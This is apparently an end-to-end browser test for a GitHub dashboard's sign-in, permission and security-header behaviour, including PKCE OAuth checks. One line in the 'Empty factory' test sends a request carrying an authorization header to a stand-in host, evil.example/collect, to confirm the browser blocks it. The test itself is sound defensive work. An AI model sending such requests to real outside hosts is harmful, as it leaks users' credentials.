/**
 * Runs the built dashboard in a real browser against a stand-in for GitHub's API.
 *
 *   npm run build && node e2e/check-site.mjs [--shots dir]
 *
 * Needs Playwright (resolved from PLAYWRIGHT_PATH, or the usual module path) and
 * its Chromium. It is not part of `npm test` because of that; the unit tests
 * cover the logic and this covers what only a browser shows: that every page
 * renders on an empty factory, that sign-in reports a missing permission in
 * words, and that the token never leaves for any host but GitHub's API.
 */
import { createServer } from "node:http";
import { readFile, mkdir } from "node:fs/promises";
import { existsSync, readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { join, extname, dirname } from "node:path";
import { createHash } from "node:crypto";
import { fileURLToPath } from "node:url";

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.PLAYWRIGHT_PATH ?? "playwright");
const here = dirname(fileURLToPath(import.meta.url));
const OUT = join(here, "..", "out");
const shotsDir = process.argv.includes("--shots") ? process.argv[process.argv.indexOf("--shots") + 1] : null;

const PAGES = ["/", "/dashboard/", "/live/", "/work/", "/runs/", "/guardrails/", "/improvement/", "/factory/", "/sessions/"];
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".json": "application/json", ".svg": "image/svg+xml", ".woff2": "font/woff2" };

/** The headers file, as Cloudflare Pages applies it: the rules under `/*` go on every response. */
function headerRules() {
  const file = join(OUT, "_headers");
  if (!existsSync(file)) return {};
  const rules = {};
  let applies = false;
  for (const line of readFileSync(file, "utf8").split("\n")) {
    if (line.trim() === "" || line.trim().startsWith("#")) continue;
    if (!line.startsWith(" ")) { applies = line.trim() === "/*"; continue; }
    if (!applies) continue;
    const i = line.indexOf(":");
    rules[line.slice(0, i).trim()] = line.slice(i + 1).trim();
  }
  return rules;
}

/* A static file server that behaves like Cloudflare Pages: a folder serves its index, a miss serves 404.html. */
function serve() {
  const extra = headerRules();
  const server = createServer(async (req, res) => {
    const url = new URL(req.url, "http://x");
    let path = decodeURIComponent(url.pathname);
    let file = join(OUT, path);
    if (path.endsWith("/")) file = join(file, "index.html");
    else if (!extname(file) && existsSync(join(file, "index.html"))) file = join(file, "index.html");
    if (!existsSync(file)) {
      res.writeHead(404, { "content-type": "text/html", ...extra });
      res.end(existsSync(join(OUT, "404.html")) ? await readFile(join(OUT, "404.html")) : "not found");
      return;
    }
    res.writeHead(200, { "content-type": TYPES[extname(file)] ?? "application/octet-stream", ...extra });
    res.end(await readFile(file));
  });
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve({ server, base: `http://127.0.0.1:${server.address().port}` })));
}

const json = (route, body, status = 200) => route.fulfill({ status, contentType: "application/json", body: JSON.stringify(body) });

/** An empty factory: the repository exists and the token is good, but nothing has ever run. */
function emptyFactory(overrides = {}, { installed = false } = {}) {
  return (route, url) => {
    const p = url.pathname.replace(/^\/repos\/acme\/widgets\/?/, "");
    for (const [key, status] of Object.entries(overrides)) if (p.includes(key)) return json(route, { message: "Resource not accessible by personal access token" }, status);
    if (p === "") return json(route, { permissions: { push: true, admin: true }, default_branch: "main", private: true });
    if (p === "contents") return json(route, []);
    if (p.startsWith("pulls") || p.startsWith("issues")) return json(route, []);
    if (p.startsWith("actions/workflows")) return json(route, { total_count: 0, workflows: [] });
    if (p.includes("check-runs")) return json(route, { total_count: 0, check_runs: [] });
    if (p.startsWith("git/matching-refs")) return json(route, []);
    if (p === "collaborators" || p.startsWith("collaborators")) return json(route, [{ login: "me", role_name: "admin", permissions: { admin: true, push: true } }]);
    if (installed && p.startsWith("contents/.factory/definition/factory.yaml")) {
      return json(route, { content: Buffer.from("schema: factory/1\nbudget:\n  monthly_usd: 35\n").toString("base64"), encoding: "base64", sha: "a".repeat(40) });
    }
    return json(route, { message: "Not Found" }, 404);
  };
}

const problems = [];
const fail = (m) => { problems.push(m); console.log("  FAIL", m); };
const ok = (m) => console.log("  ok  ", m);
const check = (cond, m) => (cond ? ok(m) : fail(m));

const BAD_TEXT = [/\bundefined\b/, /\bNaN\b/, /\[object /, /Something went wrong/i, /GitHub returned/i, /Not found\. Either/i];

async function open(browser, base, handler) {
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await context.newPage();
  const seen = { hosts: new Map(), consoleErrors: [], pageErrors: [] };
  page.on("console", (m) => m.type() === "error" && !/fonts\.googleapis\.com|fonts\.gstatic\.com/.test(m.text()) && !/Failed to load resource|ERR_/.test(m.text()) && seen.consoleErrors.push(m.text()));
  page.on("pageerror", (e) => seen.pageErrors.push(String(e)));
  await page.route("**/*", async (route) => {
    const url = new URL(route.request().url());
    if (url.origin === base) return route.continue();
    const headers = route.request().headers();
    seen.hosts.set(url.origin, (seen.hosts.get(url.origin) ?? 0) + 1);
    if (headers["authorization"] !== undefined) seen.hosts.set(url.origin + " WITH TOKEN", 1);
    if (url.origin === "https://api.github.com") return handler(route, url);
    return route.abort(); // fonts and anything else: not needed, and not reachable here
  });
  return { context, page, seen };
}

async function signIn(page, base, token = "github_pat_" + "t".repeat(40), repo = "acme/widgets") {
  // The root is the landing page now: somebody arriving cold is told what this
  // is before being asked to sign in to it. A link carrying a repository — the
  // one setup hands over — skips straight past it, which is what this does.
  await page.goto(`${base}/?repo=${encodeURIComponent(repo)}`);
  await page.getByPlaceholder("owner/name").fill(repo);
  await page.getByPlaceholder("github_pat_…").fill(token);
  await page.getByRole("button", { name: "Connect" }).click();
}


/**
 * The site's own sign-in function and GitHub's sign-in page, stood in for. The
 * static server has no Functions, so /api/auth is answered here, and the
 * redirect to github.com is followed straight back to the dashboard as GitHub
 * would after the person approves.
 */
async function mockSignInService(page, base, { outcome = "approve", refreshStatus = 200 } = {}) {
  const calls = { start: [], exchange: [], refresh: [], config: 0 };
  await page.route(`${base}/api/auth/**`, async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    const path = url.pathname.replace("/api/auth", "");
    if (path === "/config") { calls.config++; return json(route, { enabled: true, install_url: "https://github.com/apps/software-factory-dashboard/installations/new" }); }
    if (path === "/start") {
      calls.start.push({ state: url.searchParams.get("state"), challenge: url.searchParams.get("code_challenge") });
      const authorize = new URL("https://github.com/login/oauth/authorize");
      authorize.searchParams.set("client_id", "Iv1.test");
      authorize.searchParams.set("redirect_uri", `${base}/`);
      authorize.searchParams.set("state", url.searchParams.get("state"));
      authorize.searchParams.set("code_challenge", url.searchParams.get("code_challenge"));
      authorize.searchParams.set("code_challenge_method", "S256");
      return json(route, { authorize_url: authorize.toString() });
    }
    if (path === "/exchange") {
      calls.exchange.push({ body: JSON.parse(req.postData() ?? "{}"), origin: req.headers()["origin"] });
      return json(route, { access_token: "ghu_" + "a".repeat(30), expires_in: 28800, refresh_token: "ghr_" + "b".repeat(30), refresh_token_expires_in: 15897600 });
    }
    if (path === "/refresh") {
      calls.refresh.push(JSON.parse(req.postData() ?? "{}"));
      if (refreshStatus !== 200) return json(route, { error: "bad_refresh_token" }, refreshStatus);
      return json(route, { access_token: "ghu_" + "n".repeat(30), expires_in: 28800, refresh_token: "ghr_" + "m".repeat(30) });
    }
    return json(route, { error: "not found" }, 404);
  });
  await page.route("https://github.com/login/oauth/authorize*", (route) => {
    const u = new URL(route.request().url());
    const back = new URL(`${base}/`);
    back.searchParams.set("state", u.searchParams.get("state"));
    if (outcome === "approve") back.searchParams.set("code", "testcode12345"); else back.searchParams.set("error", "access_denied");
    return route.fulfill({ status: 302, headers: { location: back.toString() } });
  });
  return calls;
}

async function visitAll(page, base, label, { expectEmpty = false } = {}) {
  for (const path of PAGES) {
    await page.goto(base + path);
    await page.locator("main").first().waitFor();
    await page.waitForTimeout(500);
    const text = await page.locator("main").innerText();
    for (const re of BAD_TEXT) if (re.test(text)) fail(`${label} ${path}: shows "${text.match(re)[0]}"`);
    check(text.trim().length > 40, `${label} ${path}: has content (${text.trim().length} chars)`);
    if (expectEmpty) console.log(`     --- ${path}\n${text.split("\n").filter(Boolean).slice(0, 14).map((l) => "     | " + l).join("\n")}`);
    if (shotsDir !== null) {
      await mkdir(shotsDir, { recursive: true });
      await page.screenshot({ path: join(shotsDir, `${label}-${path === "/" ? "home" : path.replaceAll("/", "")}.png`) });
    }
  }
}

const { server, base } = await serve();
const browser = await chromium.launch();
try {
  console.log("1. Sign-in page");
  {
    const { page, context } = await open(browser, base, emptyFactory());
    await page.goto(`${base}/?repo=acme/widgets`);
    await page.getByText("Connect your repository").waitFor();
    check((await page.getByPlaceholder("owner/name").inputValue()) === "acme/widgets", "a link's ?repo= fills the repository");
    const href = await page.getByRole("link", { name: /token form/ }).getAttribute("href");
    const u = new URL(href);
    check(u.origin === "https://github.com" && u.pathname === "/settings/personal-access-tokens/new", "the token link opens GitHub's own form");
    check(u.searchParams.get("target_name") === "acme" && u.searchParams.get("pull_requests") === "write", "the link has the owner and permissions filled in");
    check(/Only select repositories/.test(await page.locator("body").innerText()), "the page says to pick the repository");
    await context.close();
  }

  console.log("1b. The security headers");
  {
    const r = await fetch(`${base}/`);
    const csp = r.headers.get("content-security-policy") ?? "";
    check(/connect-src 'self' https:\/\/api\.github\.com(;|$)/.test(csp), "the page may connect only to itself and api.github.com");
    check(/frame-ancestors 'none'/.test(csp), "it cannot be framed");
    check(r.headers.get("referrer-policy") === "no-referrer", "it sends no referrer");
  }

  console.log("1b. The landing page");
  {
    const { page, context } = await open(browser, base, () => { throw new Error("the landing must not call GitHub"); });
    // A stranger sent the bare link is told what this is before being asked
    // to sign in to it.
    await page.goto(`${base}/`);
    await page.getByText(/Wake up to a pull request/).waitFor();
    ok("a stranger gets the landing page, not a sign-in form");
    check((await page.getByPlaceholder("owner/name").count()) === 0, "the landing does not demand a repository up front");

    // The link setup hands over names a repository, and skips it.
    await page.goto(`${base}/?repo=acme%2Fwidgets`);
    await page.getByPlaceholder("owner/name").waitFor();
    ok("a link carrying a repository goes straight to sign-in");
    await context.close();
  }

  console.log("2. Demo");
  {
    const { page, context, seen } = await open(browser, base, () => { throw new Error("demo must not call GitHub"); });
    await page.goto(`${base}/`);
    await page.getByRole("button", { name: /demo/ }).click();
    await page.getByText(/This is a demo/).waitFor();
    await visitAll(page, base, "demo");
    await page.goto(`${base}/?demo`).catch(() => {});
    check(![...seen.hosts.keys()].some((h) => h.includes("api.github.com")), "the demo makes no request to GitHub");
    check(seen.pageErrors.length === 0 && seen.consoleErrors.length === 0, `demo: no browser errors ${[...seen.pageErrors, ...seen.consoleErrors].join(" | ")}`);
    // a write is refused in words
    await page.goto(`${base}/factory/`);
    await context.close();
  }

  console.log("3. Empty factory");
  {
    const { page, context, seen } = await open(browser, base, emptyFactory());
    await signIn(page, base);
    await page.getByText("Waiting on you").first().waitFor();
    await visitAll(page, base, "empty", { expectEmpty: true });
    check(seen.pageErrors.length === 0 && seen.consoleErrors.length === 0, `empty: no browser errors ${[...seen.pageErrors, ...seen.consoleErrors].join(" | ")}`);
    const home = await (async () => { await page.goto(`${base}/`); await page.waitForTimeout(600); return page.locator("main").innerText(); })();
    check(/no factory on this repository yet/i.test(home) && /Claude Code/.test(home), "a repository with no factory is told how to get one");
    const verdict = await page.evaluate(() => fetch("https://evil.example/collect", { headers: { authorization: "x" } }).then(() => "sent", () => "blocked"));
    check(verdict === "blocked" && ![...seen.hosts.keys()].some((h) => h.includes("evil.example")), "the browser itself blocks a request to any other host");
    const tokenHosts = [...seen.hosts.keys()].filter((h) => h.endsWith("WITH TOKEN"));
    check(tokenHosts.length === 1 && tokenHosts[0] === "https://api.github.com WITH TOKEN", `the token went only to api.github.com (${tokenHosts.join(", ")})`);
    await context.close();
  }

  console.log("3b. A factory that is set up and has not run");
  {
    const { page, context } = await open(browser, base, emptyFactory({}, { installed: true }));
    await signIn(page, base);
    await page.getByText("Waiting on you").first().waitFor();
    await page.waitForTimeout(800);
    const home = await page.locator("main").innerText();
    check(/set up here and has not run yet/i.test(home), "a set-up factory with no runs is told what starts the first");
    check(!/no factory on this repository/i.test(home), "and is not told it has no factory");
    await context.close();
  }

  console.log("4. A missing permission is named at sign-in");
  {
    const { page, context } = await open(browser, base, emptyFactory({ pulls: 403, "actions/": 403 }));
    await signIn(page, base);
    await page.getByText(/missing permissions/).waitFor();
    const text = await page.locator("body").innerText();
    check(/Pull requests/.test(text) && /Actions/.test(text), "names Pull requests and Actions");
    check(!/Issues,|Contents,/.test(text.split("missing permissions")[1].split("\n")[0]), "does not name permissions that are fine");
    check((await page.getByText("Waiting on you").count()) === 0, "stays on the sign-in page");
    await context.close();
  }

  console.log("5. A wrong token and a hidden repository");
  {
    const { page, context } = await open(browser, base, (route) => json(route, { message: "Bad credentials" }, 401));
    await signIn(page, base);
    await page.getByText(/refused that token/).waitFor();
    ok("a refused token says so");
    await context.close();
    const b = await open(browser, base, (route) => json(route, { message: "Not Found" }, 404));
    await signIn(b.page, base);
    await b.page.getByText(/cannot see this repository/).waitFor();
    ok("a repository the token cannot see says so");
    await b.context.close();
  }

  console.log("6. A link for another repository");
  {
    const { page, context } = await open(browser, base, emptyFactory());
    await signIn(page, base);
    await page.getByText("Waiting on you").first().waitFor();
    await page.goto(`${base}/?repo=acme/other`);
    await page.getByText(/This link is for/).waitFor();
    ok("offers to switch repositories");
    await context.close();
  }

  console.log("7. Sign in with GitHub");
  {
    const { page, context, seen } = await open(browser, base, emptyFactory({}, { installed: true }));
    const calls = await mockSignInService(page, base);
    await page.goto(`${base}/?repo=acme/widgets`);
    const button = page.getByRole("button", { name: "Sign in with GitHub" });
    await button.waitFor();
    ok("the GitHub button is the main way in");
    check(!(await page.getByPlaceholder("github_pat_…").isVisible()), "the token form is tucked away until asked for");
    await page.getByText("Use a token instead").click();
    check(await page.getByPlaceholder("github_pat_…").isVisible(), "and opens on request");
    await page.getByText("Use a token instead").click();
    await button.click();
    await page.getByText("Waiting on you").first().waitFor();
    ok("one click, and the person is in");
    check(!page.url().includes("code=") && !page.url().includes("state="), "the code is gone from the address bar");
    check(calls.start.length === 1 && calls.exchange.length === 1, "one start and one exchange");
    const challenge = calls.start[0].challenge;
    const verifier = calls.exchange[0].body.code_verifier;
    check(createHash("sha256").update(verifier).digest("base64url") === challenge, "the verifier sent at exchange matches the challenge sent at start (PKCE)");
    check(calls.exchange[0].body.code === "testcode12345" && Object.keys(calls.exchange[0].body).sort().join() === "code,code_verifier", "the exchange carries the code and verifier, nothing else");
    check(calls.exchange[0].origin === base, "the exchange comes from the dashboard's own origin");
    const stored = await page.evaluate(() => ({ t: sessionStorage.getItem("bsf.token"), r: sessionStorage.getItem("bsf.refresh"), e: sessionStorage.getItem("bsf.expires"), s: sessionStorage.getItem("bsf.oauth.state"), v: sessionStorage.getItem("bsf.oauth.verifier") }));
    check(stored.t?.startsWith("ghu_") && stored.r?.startsWith("ghr_") && Number(stored.e) > Date.now(), "the token, refresh token and expiry are kept for this tab");
    check(stored.s === null && stored.v === null, "the one-time state and verifier are spent");
    await visitAll(page, base, "sso");
    const tokenHosts = [...seen.hosts.keys()].filter((h) => h.endsWith("WITH TOKEN"));
    check(tokenHosts.length === 1 && tokenHosts[0] === "https://api.github.com WITH TOKEN", `the signed-in token went only to api.github.com (${tokenHosts.join(", ")})`);
    check(seen.pageErrors.length === 0 && seen.consoleErrors.length === 0, `sso: no browser errors ${[...seen.pageErrors, ...seen.consoleErrors].join(" | ")}`);
    if (shotsDir !== null) await page.screenshot({ path: join(shotsDir, "sso-signed-in.png") });
    await context.close();
  }

  console.log("7b. Signed in to GitHub, app not installed yet");
  {
    let installed = false;
    const behind = emptyFactory({}, { installed: true });
    const { page, context } = await open(browser, base, (route, url) => (installed ? behind(route, url) : json(route, { message: "Not Found" }, 404)));
    await mockSignInService(page, base);
    await page.goto(`${base}/?repo=acme/widgets`);
    await page.getByRole("button", { name: "Sign in with GitHub" }).click();
    await page.getByText(/cannot see/).waitFor();
    const text = await page.locator("body").innerText();
    check(/Install it on that repository/.test(text), "says to install the app on the repository");
    const href = await page.getByRole("link", { name: "Install the app" }).getAttribute("href");
    check(href === "https://github.com/apps/software-factory-dashboard/installations/new", "links to the app's install page");
    check((await page.getByText("Waiting on you").count()) === 0, "stays on the sign-in page");
    if (shotsDir !== null) await page.screenshot({ path: join(shotsDir, "sso-install.png") });
    installed = true;
    await page.getByRole("button", { name: "Check again" }).click();
    await page.getByText("Waiting on you").first().waitFor();
    ok("after installing, Check again lets the person in without signing in twice");
    await context.close();
  }

  console.log("7c. Declined at GitHub");
  {
    const { page, context } = await open(browser, base, emptyFactory());
    await mockSignInService(page, base, { outcome: "deny" });
    await page.goto(`${base}/?repo=acme/widgets`);
    await page.getByRole("button", { name: "Sign in with GitHub" }).click();
    await page.getByText(/did not give access/).waitFor();
    ok("a refusal at GitHub is explained");
    check(await page.getByRole("button", { name: "Sign in with GitHub" }).isVisible(), "and the button is still there to try again");
    await context.close();
  }

  console.log("7d. An expired GitHub sign-in is renewed");
  {
    const { page, context } = await open(browser, base, emptyFactory({}, { installed: true }));
    const calls = await mockSignInService(page, base);
    await page.addInitScript(() => {
      if (sessionStorage.getItem("bsf.token") !== null) return;
      sessionStorage.setItem("bsf.token", "ghu_" + "o".repeat(30));
      sessionStorage.setItem("bsf.repo", "acme/widgets");
      sessionStorage.setItem("bsf.refresh", "ghr_" + "o".repeat(30));
      sessionStorage.setItem("bsf.expires", String(Date.now() - 60_000));
    });
    await page.goto(`${base}/`);
    await page.getByText("Waiting on you").first().waitFor();
    check(calls.refresh.length === 1 && calls.refresh[0].refresh_token.startsWith("ghr_o"), "the old refresh token was exchanged once, before any request");
    const stored = await page.evaluate(() => ({ t: sessionStorage.getItem("bsf.token"), r: sessionStorage.getItem("bsf.refresh") }));
    check(stored.t?.startsWith("ghu_n") && stored.r?.startsWith("ghr_m"), "the new pair replaced the old one");
    await context.close();
  }

  console.log("7e. A GitHub sign-in that can no longer be renewed");
  {
    const { page, context } = await open(browser, base, emptyFactory());
    await mockSignInService(page, base, { refreshStatus: 400 });
    await page.addInitScript(() => {
      if (sessionStorage.getItem("bsf.token") !== null) return;
      sessionStorage.setItem("bsf.token", "ghu_" + "o".repeat(30));
      sessionStorage.setItem("bsf.repo", "acme/widgets");
      sessionStorage.setItem("bsf.refresh", "ghr_" + "o".repeat(30));
      sessionStorage.setItem("bsf.expires", String(Date.now() - 60_000));
    });
    await page.goto(`${base}/`);
    await page.getByText(/sign-in with GitHub ended/).waitFor();
    ok("says the sign-in ended and offers to sign in again");
    check((await page.evaluate(() => sessionStorage.getItem("bsf.token"))) === null, "and nothing stale is left stored");
    await context.close();
  }

  console.log("7f. A planted code is ignored");
  {
    const { page, context } = await open(browser, base, emptyFactory());
    const calls = await mockSignInService(page, base);
    await page.goto(`${base}/?code=planted12345&state=${"x".repeat(32)}`);
    await page.getByText(/did not start from this page/).waitFor();
    check(calls.exchange.length === 0, "nothing was exchanged");
    check(!page.url().includes("planted"), "the planted code is cleared from the address");
    await context.close();
  }
} finally {
  await browser.close();
  server.close();
}

console.log(problems.length === 0 ? "\nAll checks passed." : `\n${problems.length} problem(s):\n- ${problems.join("\n- ")}`);
process.exit(problems.length === 0 ? 0 : 1);
